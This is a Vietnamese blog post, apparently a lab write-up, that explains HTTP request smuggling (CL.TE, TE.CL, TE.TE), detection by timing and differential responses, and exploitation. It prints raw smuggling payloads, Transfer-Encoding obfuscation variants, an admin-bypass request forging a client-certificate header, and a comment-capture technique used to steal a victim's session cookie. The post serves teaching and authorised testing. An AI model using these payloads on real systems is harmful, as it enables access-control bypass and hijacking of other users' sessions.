---
layout: single
title: "HTTP Request Smuggling: Deep Dive into Detection and Exploitation"
author_profile: false
classes: wide
categories: [Penetration-Testing, web]
tags: [http-request-smuggling, web-security]
date: 2026-05-17
permalink: /penetration-testing/http-request-smuggling/
---

Hãy tưởng tượng bạn đi mua đồ ở siêu thị. Bạn đặt 3 món hàng lên băng chuyền, nhưng vì nhân viên thu ngân và người xếp hàng không hiểu ý nhau, món thứ 3 của bạn lại bị "dính" sang hóa đơn của người đứng sau. Đó chính là cách HTTP Request Smuggling hoạt động — kẻ tấn công lén nhét một yêu cầu độc hại để người dùng tiếp theo phải gánh chịu.

Hôm nay , chúng ta cùng đến với 1 chủ đề tấn công mà dạo gần đây CVE nổ khá là nhiều gần đây .
Trong giai đoạn cuối năm 2025 và đầu năm 2026,  lỗ hổng nghiêm trọng này đã được phát hiện trong các nền tảng phổ biến như ASP.NET Core, Golang và Axios... Và lỗ hổng đó gọi là HTTP request smuggling . 

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516235843.png)

## I. HTTP Request Smuggling là gì ? 

HTTP Request Smuggling là kĩ thuật tấn công khai thác sự bất đồng bộ yêu cầu của cơ sở hạ tầng web như máy chủ proxy , load balancer với máy chủ backend . Diễn giải yêu cầu HTTP theo 1 cách hiểu khác nhau , chính vì sự không đồng nhất giữa các yêu cầu này dẫn tới cho phép attacker có thể vượt qua tường lửa cũng như các biện pháp an ninh và có khả năng chèn các yêu cầu độc hại ẩn giấu bên trong 1 cách bất hợp pháp.

Lỗi tấn công này chủ yếu xảy ra với các HTTP /1 . Tuy nhiên các trang web hỗ trợ HTTP /2 cũng có thể bị khai thác với phương pháp bằng phương pháp HTTP Downgrading 
(Bạn có thể tham khảo ở link này: [TryHackMe - HTTP/2 Request Smuggling](https://tryhackme.com/room/http2requestsmuggling))


Vậy chuyện gì xảy ra khi 1 cuộc tấn công HTTP request smuggling diễn ra ? 

Các ứng dụng web ngày nay thường sử dụng các chuỗi yêu cầu HTTP giữa người dùng tới backend . Người dùng gửi yêu cầu của mình qua frontend (thường là các máy chủ cân bằng tải như Load Balancer hay Reverse Proxy như Nginx , CloudFlare , HAproxy,... ) sau đó mới gửi tới máy chủ backend . Trong trường hợp này điều quan trọng là FE và BE phải thống nhất ranh giới của các yêu cầu . Nếu không attacker có thể gửi yêu cầu 1 cách không rõ ràng , từ đó dẫn tới BE và FEcó thể xử lí hệ thống theo nghĩa khác nhau.

Chủ yếu lỗ hổng HTTP RS bị phát sinh do xoay quanh 2 yếu tố trong 2 header của gói tin là HTTP đó là : Content - Length  và Transfer - Encoding .

Content - Length thì các bạn cũng biết rồi , thì nó là kích thước của body theo đơn vị byte 

Còn Transfer-Encoding có thể được sử dụng để chỉ ra rằng phần message body sử dụng chunked encoding. Tức là phần message trong body chứa 1 hoặc nhiều các đoạn khối của dữ liệu. Mỗi chunk .Khi nội dung dữ liệu được **chunked** , nó sẽ có dạng như sau: ký tự đầu tiên chính là kích thước của đoạn **chunked theo dạng hex, tiếp theo là** **chunked** content và end content là số 0.. Ví dụ:

```
POST /search HTTP/1.1 Host: 
normal-website.com \
Content-Type: application/x-www-form-urlencoded 
Transfer-Encoding: chunked 
b 
q=smuggling 
0
```



Vì theo đặc tả HTTP /1.1 , 2 kiểu trên đều chỉ định độ dài của nội dung dữ liệu theo phương pháp khác nhau ,nên một thông điệp có thể sử dụng cả 2 phương pháp cùng lúc , dẫn tới sự xung đột . 
Để tìm hiểu rõ hơn thì chúng ta cùng bước tới phần tiếp theo là 


## II. Các thực hiện tấn công HTTP request smuggling

Các cuộc tấn công đánh cắp yêu cầu cổ điển liên quan đến việc đặt cả `Content-Length`tiêu đề và `Transfer-Encoding`  vào một yêu cầu HTTP/1 duy nhất và thao túng chúng sao cho máy chủ giao diện người dùng và máy chủ phụ trợ xử lý yêu cầu khác nhau. Cách thức thực hiện chính xác phụ thuộc vào hành vi của hai máy chủ:

- CL.TE : Lỗ hổng xảy ra khi FE sử dụng header Content-length trong khi đó BE sử dụng Transfer-Encoding
- TE.CL : Thì ngược lại là lỗ hổng xảy ra khi FE sử dụng Transfer-Encoding và BE lại sử dụng Content-Lenght
- TE.TE : Lỗ hổng xảy ra khi cả FE và BE đều sử dụng Transfer - Encoding , nhưng 1 trong 2 máy chủ được tác động để không xử lí nó bằng cách làm xáo trộn tiêu đề bằng 1 cách nào đó


**Tấn công CL.TE** :

Ở đây, **front-end** máy chủ sử dụng tiêu đề **Content-Length và** **back-end** máy chủ sử dụng tiêu đề **Transfer-Encoding** . Ta tiến hành tấn công **HTTP Yêu cầu buôn lậu** như sau:

```
POST / HTTP/1.1 
Host: vulnerable-website.com 
Content-Length: 13 
Transfer-Encoding: chunked 

0 

SMUGGLED
```

Phía  FE xử lý `Content-Length`phần tiêu đề và xác định rằng phần thân yêu cầu dài 13 byte, tính đến hết thẻ `SMUGGLED`. Yêu cầu này được chuyển tiếp đến Backend.

Backend server xử lý `Transfer-Encoding`, và do đó coi phần thân thông báo là sử dụng mã hóa theo từng khối. Nó xử lý khối đầu tiên, được cho là có độ dài bằng không, và do đó được coi là kết thúc yêu cầu. Các byte tiếp theo, `SMUGGLED`, không được xử lý, và máy chủ phía máy chủ sẽ coi chúng là sự bắt đầu của yêu cầu tiếp theo trong chuỗi.

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260506160613.png)


Để có cái nhìn thực tế hơn thì chúng ta đến với bài thực hành này 

Để giải quyết bài toán thực hành, hãy lén gửi một yêu cầu đến máy chủ phụ trợ, sao cho yêu cầu tiếp theo đượcbackend xử lý có vẻ như sử dụng phương thức đó. `GPOST`.

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260506161659.png)



Ở đây trong phần cài đặt bên cạnh nút Send , bạn hãy tắt chức năng update content-length của BS, đồng thời bên request attributes trong bảng inspector bạn đổi từ HTTP/2 sang HTTP/1.1

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260506161858.png)


Ở đây bạn có thể thấy được - 
**Giai đoạn 1 (Tại Front-end):**  
    Front-end nhìn vào `Content-Length: 6`. Nó đếm đủ 6 ký tự ở phần thân (body) gồm: `0`, `\r`, `\n`, `\r`, `\n`, và chữ `G`. Vì thấy đúng số lượng, nó chuyển tiếp toàn bộ gói tin này sang cho Back-end.
- **Giai đoạn 2 (Tại Back-end):**  
    Back-end lại nhìn vào `Transfer-Encoding: chunked`. Trong chế độ này, dữ liệu được kết thúc bằng một ký tự `0` kèm theo hai dòng trống (`\r\n\r\n`).  
    Khi Back-end đọc đến dòng `0` và hai dòng trống, nó nghĩ rằng: _"A, request này xong rồi!"_. Nó xử lý request POST đó và trả về `200 OK`.
- **Giai đoạn 3 (Sự cố "Smuggling"):**  
    Vì Front-end đã gửi 6 ký tự, nhưng Back-end chỉ mới xử lý phần đến dòng `0`, nên chữ **`G`** còn sót lại bị bỏ rơi trong bộ đệm (buffer) của kết nối TCP đó.

3. Tại sao phải gửi 2 lần?

- **Lần gửi 1:** Để "nhồi" chữ `G` vào hàng đợi của Back-end.
- **Lần gửi 2:** Khi bạn gửi tiếp một request POST thông thường, Back-end sẽ lấy chữ `G` đang nằm chờ sẵn đó ghép vào đầu request mới.
    - Request mới ban đầu là: `POST / HTTP/1.1...`
    - Sau khi bị ghép chữ `G` vào đầu, nó trở thành: `GPOST / HTTP/1.1...`

Do phương thức **GPOST** không tồn tại trong giao thức HTTP, Back-end sẽ báo lỗi: _"Unrecognized method GPOST"_. Đây chính là bằng chứng cho thấy bạn đã "buôn lậu" thành công dữ liệu từ request trước sang request sau.


**Tấn công TE.CL:**

Ở đây, front-end máy chủ sử dụng tiêu đề **Transfer-Encoding** và back-end máy chủ sử dụng tiêu đề **Content-Length** . Ta tiến hành tấn công  như sau:

```
POST / HTTP/1.1 
Host: vulnerable-website.com 
Content-Length: 3 
Transfer-Encoding: chunked
 
8 
SMUGGLED 
0
```

FE xử lý `Transfer-Encoding` và do đó coi phần thân thông báo là sử dụng mã hóa theo từng khối. Nó xử lý khối đầu tiên, được cho là dài 8 byte, cho đến khi bắt đầu dòng tiếp theo `SMUGGLED`. Nó xử lý khối thứ hai, được cho là có độ dài bằng không, và do đó được coi là kết thúc yêu cầu. Yêu cầu này được chuyển tiếp đến máy chủ phụ trợ.

Máy chủ phía máy chủ xử lý `Content-Length`phần tiêu đề và xác định rằng phần thân yêu cầu dài 3 byte, tính đến đầu dòng tiếp theo sau `8`. Các byte tiếp theo, bắt đầu từ `SMUGGLED`, sẽ không được xử lý và backend sẽ coi chúng là phần bắt đầu của yêu cầu tiếp theo trong chuỗi.

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260506163002.png)


![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260506164619.png)

- **Front-end nhìn thấy `Transfer-Encoding: chunked`:**
    - Nó thấy `5c` (hệ thập phân là 92). Nó sẽ đợi đọc tiếp 92 bytes dữ liệu.
    - Nó đọc toàn bộ đoạn `GPOST ... x=1` và cuối cùng là số `0` (đánh dấu hết dữ liệu chunked).
    - **Kết quả:** Front-end thấy gói tin này hợp lệ và gửi toàn bộ xuống Back-end.
- **Back-end nhìn thấy `Content-Length: 4`:**
    - Nó  chỉ đọc đúng 4 bytes đầu tiên của phần thân (body).
    - 4 bytes đó chính là `5c\r\n` (vừa đủ 4 ký tự).
    - **Hậu quả:** Back-end coi như yêu cầu thứ nhất đã xong. Phần còn lại (từ chữ `GPOST` trở đi) bị coi là "dữ liệu thừa" và bị kẹt lại trong bộ đệm (buffer) của kết nối.


Khi một người dùng bình thường (nạn nhân) gửi một yêu cầu hợp lệ (ví dụ: `GET /index.html`) đến hệ thống trên cùng một kết nối đó:

Back-end sẽ lấy phần "dữ liệu thừa" đang kẹt ở trên (`GPOST ...`) dán đè lên phía trước yêu cầu của nạn nhân. Yêu cầu của nạn nhân bỗng nhiên biến thành:



```
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1GET /index.html ...
```


Nạn nhân sẽ nhận được phản hồi cho cái `GPOST`  thay vì trang chủ mà họ muốn.

> **Kết thúc một "Chunk":** Trong chế độ `Transfer-Encoding: chunked`, số **0** là tín hiệu báo cho Front-end biết: _"Hết dữ liệu rồi nhé!"_. Nhưng chỉ số 0 thôi là chưa đủ, giao thức yêu cầu phải có một chuỗi kết thúc chuẩn là `0\r\n\r\n` . Bạn phải cập nhật như vậy trong bài lab thì nó mới hoàn thành được 



**Tấn công TE.TE:**

Ở đây, **front-end** và **back-end** của máy chủ đều xử lý **Transfer-Encoding** tiêu đề , nhưng một trong các máy chủ không được xử lý tiêu đề đã được trộn theo bất kỳ cách nào.

Có vô số cách để trộn tiêu đề Transfer-Encoding . Ví dụ:


```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

Trong lỗ hổng **TE.TE**, cả Front-end (FE) và Back-end (BE) đều hỗ trợ tiêu đề `Transfer-Encoding: chunked`. Tuy nhiên, kẻ tấn công sẽ **"ngụy trang"** tiêu đề này bằng cách làm sai lệch nó một chút so với chuẩn HTTP.

Mục tiêu là: **Làm sao để một máy chủ vẫn đọc hiểu là "chunked", còn máy chủ kia thì thấy lạ quá nên bỏ qua.**

1. Tại sao kỹ thuật này lại thành công?

- **Sự dễ dãi (Tolerance):** Có máy chủ rất "khó tính" (chỉ nhận đúng chuẩn), nhưng có máy chủ lại "dễ tính" (thấy có khoảng trắng hay viết hoa thường vẫn chấp nhận). Chính sự khác biệt này tạo ra kẽ hở.

2. Các kỹ thuật "Làm mờ" (Obfuscation) phổ biến

Bạn có thể liệt kê các ví dụ từ ảnh của bạn vào blog dưới dạng bảng hoặc danh sách để người đọc dễ theo dõi:

|Kỹ thuật|Ví dụ|Giải thích|
|---|---|---|
|**Thêm ký tự lạ**|`Transfer-Encoding: xchunked`|Một server có thể bỏ qua chữ `x` và vẫn đọc là `chunked`.|
|**Sai lệch khoảng trắng**|`Transfer-Encoding : chunked`|Khoảng trắng trước dấu hai chấm có thể làm một server bối rối.|
|**Dùng phím Tab**|`Transfer-Encoding:[tab]chunked`|Dùng ký tự Tab thay vì Space.|
|**Ghi đè/Nối chuỗi**|`X: X[\n]Transfer-Encoding: chunked`|Sử dụng ký tự xuống dòng (`\n`) để "giấu" tiêu đề thật sau một tiêu đề giả.|
|**Bọc dòng**|`Transfer-Encoding`  <br>`: chunked`|Chia tiêu đề thành hai dòng.|

3. Kịch bản tấn công (Cách nó trở thành CL.TE hoặc TE.CL)

Khi một trong hai máy chủ bị "lừa" và bỏ qua tiêu đề `Transfer-Encoding`, nó sẽ quay về sử dụng tiêu đề `Content-Length` để đo độ dài dữ liệu.

- Nếu **FE bỏ qua TE** nhưng **BE nhận TE**: Nó trở thành lỗ hổng **CL.TE**.
- Nếu **FE nhận TE** nhưng **BE bỏ qua TE**: Nó trở thành lỗ hổng **TE.CL**.

---


![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260506165526.png)





## III. Cách phát hiện  HTTP request sumggling

Nếu sử dụng **BurpSuite Pro** , ta có thể kiểm tra lỗi **HTTP request Smuggler** khi sử dụng **Active Scan,** tải tiện ích mở rộng **HTTP request Smuggler** 

Trong phần này chúng ta cùng tìm ra các kĩ thuật khác nhau để có thể phát  hiện ra lỗ hổng HTTP request smuggling.

Việc phát hiện **HTTP Request Smuggling** thường xoay quanh một ý tưởng khá đơn giản:

> Làm cho front-end và back-end hiểu request theo hai cách khác nhau, sau đó quan sát xem server có phản ứng bất thường hay không.

Có nhiều cách để kiểm tra, nhưng phổ biến nhất vẫn là:

- **Timing-based detection** (phát hiện dựa trên độ trễ)
- **Differential response** (xác nhận dựa trên sự khác biệt của response)

---

## 1. Phát hiện bằng Timing Techniques

Đây là kỹ thuật phổ biến và an toàn nhất để phát hiện request smuggling. Ý tưởng là gửi một request được thiết kế đặc biệt sao cho:

- Nếu không có lỗ hổng → response trả về bình thường
- Nếu có lỗ hổng → một phía sẽ chờ thêm dữ liệu và gây ra **delay bất thường**

Cách này cũng chính là cơ chế mà Burp Scanner sử dụng để tự động detect request smuggling.

### Detect CL.TE bằng timing

Trong trường hợp **CL.TE**:

- Front-end ưu tiên `Content-Length`
- Back-end ưu tiên `Transfer-Encoding`

Ta có thể gửi request như sau:

```
POST / HTTP/1.1Host: vulnerable-website.comTransfer-Encoding: chunkedContent-Length: 41AX
```

Điều gì xảy ra ở đây?

**Front-end server**

Do sử dụng `Content-Length: 4`, nó chỉ forward một phần request và bỏ lại ký tự `X`.

**Back-end server**

Back-end đọc request theo `Transfer-Encoding: chunked`.

Chunk đầu tiên:

```
1A
```

có nghĩa là chunk length = `1`, body = `A`.

Nhưng back-end vẫn đang chờ chunk tiếp theo hoàn chỉnh. Vì không nhận được dữ liệu mong đợi nên nó sẽ **đợi thêm dữ liệu**, dẫn đến response bị delay.

Nếu thấy request bị treo hoặc phản hồi chậm bất thường, đó có thể là dấu hiệu của **CL.TE smuggling**.

---

### Detect TE.CL bằng timing

Trong trường hợp **TE.CL**:

- Front-end xử lý theo `Transfer-Encoding`
- Back-end xử lý theo `Content-Length`

Payload thường dùng:

```
POST / HTTP/1.1Host: vulnerable-website.comTransfer-Encoding: chunkedContent-Length: 60X
```

Lúc này:

**Front-end**

Do ưu tiên `Transfer-Encoding`, nó xem:

```
0
```

là kết thúc body và forward request mà bỏ lại `X`.

**Back-end**

Lại nhìn vào:

```
Content-Length: 6
```

nên nghĩ rằng request body vẫn chưa đủ dữ liệu và tiếp tục chờ.

Kết quả là response cũng sẽ bị delay.

### Lưu ý khi dùng timing test

Nên test theo thứ tự:

**CL.TE → rồi mới TE.CL**

Lý do là payload kiểm tra **TE.CL** có thể gây ảnh hưởng tới request của người dùng khác nếu target thực tế lại vulnerable với **CL.TE**.

Nói ngắn gọn:

> CL.TE test thường stealthier và ít disruptive hơn.

---

## 2. Xác nhận lỗ hổng bằng Differential Responses

Timing delay chỉ cho thấy **khả năng** tồn tại vulnerability.

Để xác nhận chắc chắn, ta cần chứng minh rằng:

> Một request có thể can thiệp vào request khác.

Kỹ thuật này hoạt động bằng cách gửi liên tiếp:

1. **Attack request** → cố tình poison request queue
2. **Normal request** → request bình thường dùng để kiểm tra ảnh hưởng

Nếu response của request bình thường bị thay đổi theo đúng kỳ vọng → xác nhận được vulnerability.

---

### Confirm CL.TE vulnerability

Giả sử request bình thường là:

```
POST /search HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling
```

Thông thường endpoint này sẽ trả về:

```
HTTP/1.1 200 OK
```

Ta gửi attack request:

```
POST /search HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 49Transfer-Encoding: chunkedeq=smuggling&x=0GET /404 HTTP/1.1Foo: x
```

Nếu attack thành công:

Phần:

```
GET /404 HTTP/1.1Foo: x
```

sẽ bị back-end coi như **mở đầu cho request kế tiếp**.

Khi normal request tới, server sẽ parse thành:

```
GET /404 HTTP/1.1Foo: xPOST /search HTTP/1.1
```

Request này trở nên malformed và URL không hợp lệ.

Kết quả:

```
404 Not Found
```

Nếu request bình thường bỗng nhiên trả về `404` thay vì `200`, gần như chắc chắn rằng request smuggling đang xảy ra.

---

### Confirm TE.CL vulnerability

Với **TE.CL**, attack request sẽ khác:

```
POST /search HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 4Transfer-Encoding: chunked7cGET /404 HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 144x=0
```

Nếu thành công, phần từ:

```
GET /404 HTTP/1.1
```

sẽ bị “đẩy” sang request tiếp theo.

Lúc đó normal request sẽ bị biến dạng và response cũng đổi sang:

```
404 Not Found
```

=> xác nhận được vulnerability.

### Lưu ý khi test bằng Burp Repeater

Khi gửi payload TE.CL bằng Burp:

- Vào **Repeater → bỏ chọn “Update Content-Length”**
- Đảm bảo giữ nguyên `\r\n\r\n` sau chunk cuối `0`

Nếu Burp tự sửa `Content-Length`, payload có thể fail dù target vulnerable.

---

## Một vài lưu ý quan trọng khi confirm request smuggling

### 1. Dùng hai connection khác nhau

Attack request và normal request **không nên gửi chung connection**.

Nếu dùng cùng một TCP connection thì kết quả không đủ để chứng minh vulnerability tồn tại thật sự.

---

### 2. Dùng cùng endpoint nếu có thể

Nên để:

- cùng URL
- cùng parameter
- cùng route

Ví dụ:

```
/search?q=test
```

cho cả attack request và normal request.

Vì nhiều hệ thống hiện đại dùng load balancing hoặc route request khác nhau dựa vào URL.

Nếu hai request đi đến hai back-end khác nhau thì attack sẽ fail.

---

### 3. Đây là một cuộc race

Sau khi gửi attack request:

> gửi normal request ngay lập tức

Bạn đang cạnh tranh với request từ user khác.

Nếu hệ thống bận, có thể phải thử nhiều lần mới thấy kết quả.

---

### 4. Load balancer có thể khiến test fail

Nếu front-end phân phối request theo thuật toán load balancing:

- request A → backend #1
- request B → backend #2

thì attack sẽ không hoạt động.

Đó là lý do request smuggling đôi khi rất “flaky”, thử 10 lần mới dính 1 lần.

---

### 5. Cẩn thận khi test trên hệ thống thật

Nếu attack request vô tình ảnh hưởng đến request của người dùng khác thay vì request test của bạn:

> nghĩa là bạn vừa làm gián đoạn người dùng thật.

Do request smuggling có khả năng poison request queue, việc test thiếu cẩn thận trên production có thể gây ảnh hưởng tới người khác.

Vì vậy nên ưu tiên:

- môi trường lab
- staging
- bug bounty có safe harbor rõ ràng

thay vì spam payload trên production.









## IV. Cách khai thác lỗ hổng HTTP request smuggling

Giờ bạn đã quen thuộc với các khái niệm cơ bản, hãy cùng xem cách sử dụng tấn công HTTP request smuggling để tạo ra nhiều cách tấn công có mức độ nghiêm trọng cao hơn

##### Using HTTP request smuggling to bypass front-end security controls

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260509225155.png)


Ở đây bài lab này cho ta truy cập được trang home nhưng Front end server đã chặn /admin. Nhiệm vụ của chúng ta là sử dụng lỗ hổng HTTP RM để có thể bypass và truy cập trang admin để có thể xóa tài khoản Carlos 





![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260509234312.png)

Ở đây như các bạn thấy thì mình đã sử dụng CL-TE để có thể thêm request thứ 2 /admin vào nhưng server trả về lỗi 401 cùng với log 
![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260509234709.png)


Tức là backend yêu cầu truy cập admin từ localhost ,Lúc này mình chỉ cần sửa lại request smuggle bên trong, thêm `Host: localhost` vào là xong.
![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260509234930.png)


Tuy nhiên, có một cái lỗi nhỏ: khi request tiếp theo của người dùng  đến, nó sẽ bị dính vào sau cái request smuggle của mình. Để giải quyết, mình thêm header `Content-Length` vào request nội bộ đó để nó "nuốt" luôn các header của request sau, tránh làm hỏng cấu trúc request mình muốn gửi.

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260509235347.png) 


và cuối cùng chúng t cũng truy cập được admin panel

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260509235443.png)

Truy cập trực tiếp để xóa thì không được nên mình xử lí request như lúc ban đầu tiếp

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260509235557.png)

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260509235634.png)

Và bài lab bypass Front-End server để có thể truy cập vào trang admin đã xong.

Bạn có thể làm tương tự với lỗ hổng TE-CL tại đây https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl


### Revealing front-end request rewriting 

Thường thì trước khi Request được chuyển tới backend server thì , FE server  thường thực hiện rewrite lại yêu cầu bằng cách thêm các header được bổ sung 

Ví dụ như : thêm X-fowarded-for chứa Ip user , xác định ID của user dựa trên session token hoặc thêm header xác định người dùng , hoặc 1 số header có 1 số thông tin nhạy cảm mà attacker có thể khai thác 

Để có thể hình dung rõ hơn về cách thức tấn công , bạn và tui có thể làm thử bài lab này 

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260510215322.png)


Cũng như các bài lab khác , việc cần làm của chúng ta là truy cập vào /admin vốn bị block bởi FE server và xóa tài khoản Carlos 

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260510220104.png)

Đầu tiên khi duyêt  tới trang admin thì được báo với lỗi là chỉ được truy cập bằng ip của localhost 

Ở trang chủ có tính năng search nên mình thử search thì thấy input của mình nhập vào được hiển thị trên màn hình 
![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260510220639.png)


Bắt thử request này trên Burp Suite thì thấy có tham số là search = hello

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260510220741.png)

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260510222839.png)

Phản hồi thứ hai sẽ chứa kết quả theo sau là phần bắt đầu của yêu cầu HTTP được viết lại.

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260510222944.png)

Bởi vì server đã tiết lộ header quan trọng nên hãy ghi lại tiêu đề Host như trên để chúng ta có thể lấy header đó dùng cho mục đích là thêm vào ip 127.0.0.1 


![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260510223125.png)

Kết quả là chúng ta đã có thể truy cập được admin panel , việc còn lại chỉ còn là gửi request để xóa tài khoản Carlos 


![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260510223248.png)


Và done !!!!

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260510223229.png)

Điều chúng ta có thể rút ra được trong bài lab này là Trong các hệ thống thực tế, Front-end (như Nginx, F5, Cloudflare) thường thêm các header ẩn (ví dụ: `X-Forwarded-For` hoặc một cái tên ngẫu nhiên như `X-abcdef-Ip`) để báo cho Backend biết IP thực của người dùng là gì. Backend sẽ dựa vào header này để quyết định có cho phép vào trang `/admin` hay không.



### Bypassing client authentication


Trong quá trình TLS handshake, server sẽ xác thực danh tính của chính nó với client (thường là trình duyệt) bằng cách gửi certificate. Certificate này chứa **Common Name (CN)**, và giá trị này phải khớp với domain của website để client xác nhận rằng nó đang giao tiếp đúng server mong muốn.

Ngoài việc server xác thực với client, một số hệ thống còn triển khai **mutual TLS (mTLS)**, tức là phía client cũng phải cung cấp certificate cho server. Lúc này, trường **CN** trong certificate của client thường được dùng như một định danh người dùng (ví dụ username) và có thể được ứng dụng phía sau sử dụng để xử lý phân quyền hoặc xác thực.

Thông thường, thành phần đứng trước back-end (reverse proxy, load balancer hoặc front-end server) sẽ lấy thông tin từ client certificate rồi chuyển tiếp xuống ứng dụng thông qua các HTTP header không chuẩn. Ví dụ:

```
GET /admin HTTP/1.1Host: normal-website.comX-SSL-CLIENT-CN: carlos
```

Ở đây, header `X-SSL-CLIENT-CN` chứa CN của client certificate, và ứng dụng phía sau có thể dùng giá trị này để xác định người dùng là `carlos`.

Vấn đề nằm ở chỗ back-end thường **tin tưởng tuyệt đối** các header này vì chúng được cho là chỉ có front-end server mới có thể thêm vào. Nếu attacker kiểm soát được header với giá trị phù hợp, có khả năng sẽ bypass được cơ chế access control.

Trong thực tế, việc này thường không dễ khai thác vì front-end server sẽ tự động **ghi đè (overwrite)** những header như `X-SSL-CLIENT-CN` nếu client cố tình gửi lên.

Tuy nhiên, với **HTTP Request Smuggling**, request được “giấu” khỏi front-end server và đi thẳng xuống back-end. Điều đó có nghĩa là các header trong smuggled request sẽ không bị sửa hoặc ghi đè.

Ví dụ attacker có thể chèn một request như sau:

```
POST /example HTTP/1.1Host: vulnerable-website.comContent-Type: x-www-form-urlencodedContent-Length: 64Transfer-Encoding: chunked0GET /admin HTTP/1.1X-SSL-CLIENT-CN: administratorFoo: x
```

Trong trường hợp này, nếu back-end tin tưởng header `X-SSL-CLIENT-CN`, attacker có thể giả mạo danh tính của `administrator` để truy cập vào các tài nguyên bị hạn chế.




### Capturing other users' requests

Trong một số ứng dụng web, nếu tồn tại chức năng cho phép người dùng **lưu trữ và hiển thị lại dữ liệu dạng text**, ví dụ như bình luận, email, mô tả hồ sơ, tên hiển thị, tin nhắn, v.v., thì kẻ tấn công có thể lợi dụng các chức năng này để **ghi lại một phần request của người dùng khác**.

Kỹ thuật này thường xuất hiện trong bối cảnh **HTTP Request Smuggling**, khi front-end server và back-end server xử lý độ dài request không thống nhất với nhau. Nếu khai thác thành công, attacker có thể khiến request tiếp theo của nạn nhân bị nối vào body của một request đã được smuggle trước đó.


Để có thể hiểu rõ hơn thì chúng ta cùng đi sau vào phần bài tập sau đây

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516215122.png)


Bài lab này yêu cầu chúng ta có thể truy cập được vào tài khoản của nạn nhân 


Lướt sơ qua trang thì chúng ta thấy 1 vài bài post với chức năng comment , mình thử để lại comment và intercep lại request thử có gì đặc biệt ko 
![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516215420.png)




![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516215652.png)



Request này sẽ lưu nội dung trong tham số comment và hiển thị nó trên bài blog.

Điểm đáng chú ý là nếu attacker có thể smuggle một request tương tự, nhưng đặt tham số cần lưu trữ ở cuối body, ví dụ:

`csrf=...&postId=2&name=...&email=...&website=...&comment=`

thì bất kỳ dữ liệu nào bị nối thêm phía sau cũng có thể bị lưu vào phần comment.



![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516220503.png)

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516220835.png)

đã capture được request của victim, vì có dấu hiệu rất rõ:

`user-agent: Mozilla/5.0 (Victim) ...`

Nhưng hiện tại  mới capture tới đoạn:

`accept:`

chưa tới header Cookie. Nghĩa là Content-Length: 470 của request smuggled bên trong vẫn **chưa đủ lớn** để kéo thêm phần sau của request victim vào comment.

Nên tui tạo 1 request song song là Post với foo=bar cùng như nhiều dòng \r\n để có thể đủ cl

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516224859.png)

Một cái request tấn công là CL 960 , 1 cái gửi song song là 981 , vì sau nhiều lần test tui thấy  thực tế body sau comment=helo chưa đủ 960 bytes. Backend vì thế vẫn chờ thêm dữ liệu trên cùng connection.Nên khi tui gửi 2 tab lần lượt thì thì backend lấy request tab 2 append vào phần còn thiếu của tab 1. Vì comment= nằm cuối, phần POST / HTTP/1.1 ... foo=bar ... bị lưu vào comment.

Mấy cái \r\n nhiều trong tab 2 có tác dụng như **padding**: nó làm request tab 2 dài hơn, đủ byte để thỏa Content-Length đang thiếu. Khi đủ byte, backend xử lý xong request comment và trả response, nênt có fix được đoạn này

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516224917.png)



Và  sau nhiều lần test thử và tăng CL liên tục thì cuối cùng tui cũng lấy được session của Victim


![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516224711.png)

Lấy sesson token đó và đăng nhập thì chúng ta có được tài khoản của của admin.

![](/assets/images/HTTP_REQUEST_SMUGGLING/Pasted%20image%2020260516224837.png)



##  Advanced HTTP request smuggling

Sau khi đã hiểu các kỹ thuật request smuggling cơ bản như CL.TE, TE.CL hoặc TE.TE, phần nâng cao sẽ đi sâu hơn vào những biến thể phức tạp hơn, đặc biệt là các kỹ thuật liên quan đến **HTTP/2**.

